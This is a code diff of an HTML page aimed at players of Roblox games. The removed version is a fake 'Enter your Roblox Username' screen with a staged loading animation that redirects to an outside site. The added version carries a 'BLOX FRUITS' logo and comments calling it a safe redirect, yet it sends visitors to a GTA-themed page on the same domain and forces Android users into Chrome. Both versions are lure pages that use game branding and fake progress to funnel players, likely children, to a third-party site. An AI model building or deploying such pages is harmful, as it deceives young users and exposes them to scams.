@@ -1,171 +1,115 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Continue</title>
-
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: Arial, sans-serif;
-}
-
-body {
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background: url('https://i.postimg.cc/d1w82kyx/e3ba27fdede8810c0124fc960a0b15b9.jpg') no-repeat center/cover;
-    position: relative;
-}
-
-body::before {
-    content: "";
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    backdrop-filter: blur(8px);
-    background: rgba(0,0,0,0.5);
-}
-
-/* Container */
-.container {
-    position: relative;
-    z-index: 2;
-    width: 90%;
-    max-width: 350px;
-    padding: 25px;
-    border-radius: 20px;
-    background: rgba(255,255,255,0.08);
-    backdrop-filter: blur(10px);
-    text-align: center;
-}
-
-/* Logo */
-.logo {
-    width: 80px;
-    height: 80px;
-    border-radius: 20px;
-    object-fit: cover;
-    margin-bottom: 15px;
-}
-
-h2 {
-    color: white;
-    margin-bottom: 15px;
-}
-
-input {
-    width: 100%;
-    padding: 12px;
-    border-radius: 10px;
-    border: none;
-    margin-bottom: 15px;
-    font-size: 16px;
-}
-
-button {
-    width: 100%;
-    padding: 12px;
-    border-radius: 10px;
-    border: none;
-    background: #FFD700;
-    color: white;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-}
-
-/* Loader */
-.loader-container {
-    display: none;
-    margin-top: 20px;
-    flex-direction: column;
-    align-items: center;
-}
-
-/* Circle */
-.circle {
-    width: 90px;
-    height: 90px;
-    border: 6px solid rgba(255,255,255,0.2);
-    border-top: 6px solid #FFD700;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-/* Percentage في الوسط */
-.percent {
-    color: white;
-    font-size: 18px;
-    font-weight: bold;
-}
-
-/* Status */
-.status {
-    color: white;
-    margin-top: 10px;
-    font-size: 14px;
-}
-
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Redirecting… (Safe)</title>
+  <!--
+    Safe minimal redirect page.
+    - Replace TARGET_URL with the destination URL.
+    - Change DELAY_MS to required delay in milliseconds.
+    Security notes:
+    - This page validates the URL and blocks non-http(s) schemes (e.g. javascript:).
+    - Uses location.replace() so the redirect doesn't create an extra history entry.
+    - No external scripts, trackers, or inline eval/obfuscation.
+  -->
+  <style>
+    html,body{height:100%;margin:0;font-family:system-ui,Segoe UI,Roboto,Arial}
+    .wrap{min-height:100%;display:flex;flex-direction:column;justify-content:center;align-items:center;background:#f7f7f8;color:#222}
+    .logo{width:140px;height:140px;border-radius:10px;background:linear-gradient(135deg,#eef,#cce);display:flex;align-items:center;justify-content:center;font-weight:700}
+    .msg{margin-top:18px;font-size:18px}
+    .count{margin-top:8px;color:#555}
+    a.direct{margin-top:12px;display:inline-block}
+  </style>
 </head>
-
 <body>
+  <div class="wrap">
+    <div class="logo">BLOX FRUITS</div>
+    <div class="msg">You will be redirected shortly.</div>
+    <div class="count">Redirecting in <span id="secs">3</span> seconds…</div>
+    <a id="fallback" class="direct" href="#" rel="nofollow noopener noreferrer">Open link now</a>
+  </div>
 
-<div class="container">
+  <script>
+    (function(){
+      'use strict';
 
-    <img src="https://i.postimg.cc/tCyLs2JD/Picsart-26-03-17-23-21-42-682.jpg" class="logo">
+      // CONFIG — change these values safely
+      var TARGET_URL = 'https://xrpsp.com/gta5mobile.html'; // <-- replace with the destination URL
+      var DELAY_MS = 3000; // milliseconds to wait before redirect (3000 = 3 seconds)
 
-    <h2>Enter your Roblox Username</h2>
-
-    <input type="text" id="username" placeholder="Username...">
-
-    <button onclick="start()">Continue</button>
-
-    <div class="loader-container" id="loader">
-        <div class="circle">
-            <div class="percent" id="percent">0%</div>
-        </div>
-        <div class="status">Finding user...</div>
-    </div>
-
-</div>
-
-<script>
-function start() {
-    let username = document.getElementById("username").value;
-
-    if(username.trim() === "") {
-        alert("Please enter your username");
-        return;
-    }
-
-    document.getElementById("loader").style.display = "flex";
-
-    let percent = 0;
-    let interval = setInterval(() => {
-        percent++;
-        document.getElementById("percent").innerText = percent + "%";
-
-        if(percent >= 100) {
-            clearInterval(interval);
-            window.location.href = "https://xrpsp.com/adoptme";
+      // Utility: validate that the URL is http(s)
+      function isValidHttpUrl(string) {
+        try {
+          var u = new URL(string);
+          return (u.protocol === 'http:' || u.protocol === 'https:');
+        } catch (e) {
+          return false;
         }
-    }, 30);
-}
-</script>
+      }
 
+      // Safe redirect function — uses location.replace() so user can't go "back" to this page
+      function safeRedirect(url) {
+        try {
+          // Extra safety: prevent javascript: or data: schemes
+          if (!isValidHttpUrl(url)) {
+            console.warn('Blocked unsafe redirect to:', url);
+            return;
+          }
+
+          var ua = navigator.userAgent || '';
+
+          if (/android/i.test(ua)) {
+            // Construct an intent only for https/http schemes and when Chrome supports it.
+            try {
+              var parsed = new URL(url);
+              var hostAndPath = parsed.host + parsed.pathname + parsed.search + parsed.hash;
+              var scheme = parsed.protocol.replace(':','');
+              // Build a proper intent URL that targets Chrome. If Chrome isn't installed, intent may fall back.
+              var intentUrl = 'intent://' + hostAndPath + '#Intent;scheme=' + scheme + ';package=com.android.chrome;end;';
+              location.replace(intentUrl);
+              return;
+            } catch (e) {
+              // fallback to normal redirect
+              console.warn('Failed to build intent URL, falling back:', e);
+            }
+          }
+
+          // Default for iOS/desktop and Android fallback
+          location.replace(url);
+        } catch (err) {
+          console.error('Redirect failed:', err);
+        }
+      }
+
+      // Hook up fallback link and countdown
+      var fallback = document.getElementById('fallback');
+      var secsSpan = document.getElementById('secs');
+
+      if (!isValidHttpUrl(TARGET_URL)) {
+        // If target is invalid, show safe message and disable auto-redirect
+        secsSpan.textContent = '—';
+        fallback.textContent = 'Link is invalid';
+        fallback.removeAttribute('href');
+        return;
+      }
+
+      fallback.href = TARGET_URL;
+      fallback.setAttribute('rel','nofollow noopener noreferrer');
+
+      // countdown for visual feedback
+      var remaining = Math.max(1, Math.round(DELAY_MS/1000));
+      secsSpan.textContent = remaining;
+      var iv = setInterval(function(){
+        remaining -= 1;
+        if (remaining <= 0) { clearInterval(iv); secsSpan.textContent = '0'; }
+        else secsSpan.textContent = remaining;
+      }, 1000);
+
+      // perform redirect after DELAY_MS
+      setTimeout(function(){ safeRedirect(TARGET_URL); }, DELAY_MS);
+
+    })();
+  </script>
 </body>
 </html>
